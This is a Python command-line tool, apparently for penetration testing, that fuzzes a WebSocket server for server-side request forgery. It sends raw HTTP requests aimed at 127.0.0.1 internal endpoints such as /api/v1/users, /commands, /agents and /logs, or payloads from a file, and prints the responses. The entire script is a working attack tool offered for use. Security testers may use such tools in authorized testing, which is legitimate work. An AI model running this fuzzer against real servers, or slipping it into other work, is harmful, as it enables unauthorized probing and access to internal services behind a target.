import asyncio
import websockets
import argparse
import os,sys,re

##
##

async def fuzz_websocket(target, payloads):
    """
    Fuzz a WebSocket server for SSRF targets using a list of payloads.

    Args:
        target (str): The WebSocket server URL to connect to.
        payloads (list): A list of payloads to send to the server.
    """
    try:
        print(f"[***] Connecting to WebSocket server at {target}...")
        async with websockets.connect(target) as websocket:
            print("[***] Connected successfully!")

            # Send each payload and log the response
            for payload in payloads:
                print(f"[***] Sending payload: {payload.strip()}")
                await websocket.send(payload)

                # Receive and print the response
                try:
                    response = await websocket.recv()
                    print(f"[***] Response:\n{response}\n")
                except websockets.exceptions.ConnectionClosedError:
                    print(f"[!!!] Connection closed unexpectedly while sending payload.")
                    break

    except Exception as e:
        print(f"[!!!] Error: {e}")


def load_payloads(file_path):
    """
    Load a list of payloads from a file.

    Args:
        file_path (str): The path to the file containing payloads.

    Returns:
        list: A list of payloads read from the file.
    """
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"[!!!] Payloads file not found: {file_path}")
        return []


def generate_default_payloads():
    """
    Generate a list of default payloads for fuzzing.

    Returns:
        list: A list of default payloads.
    """
    return [
        "GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/system HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/auth/login HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /home/ HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/users HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/commands HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/agents HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/logs HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n",
        "GET /api/v1/status HTTP/1.1\r\nHost: 127.0.0.1\r\nConnection: close\r\n\r\n"
    ]


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WebSocket SSRF Fuzzer")
    parser.add_argument("-t", "--target", help="WebSocket target URL (e.g., ws://127.0.0.1:40056)", required=True)
    parser.add_argument("-p", "--payloads", help="Path to the payloads file (optional)", required=False)
    parser.add_argument("-d", "--default", action='store_true', help="Use default payloads instead of a file")
    args = parser.parse_args()

    # Load the payloads
    if args.default:
        payloads = generate_default_payloads()
    elif args.payloads:
        payloads = load_payloads(args.payloads)
    else:
        print("[!!!] No payloads provided. Use -d for default payloads or -p for a payloads file.")
        exit(1)

    # Run the fuzzer
    asyncio.run(fuzz_websocket(args.target, payloads))

##
##
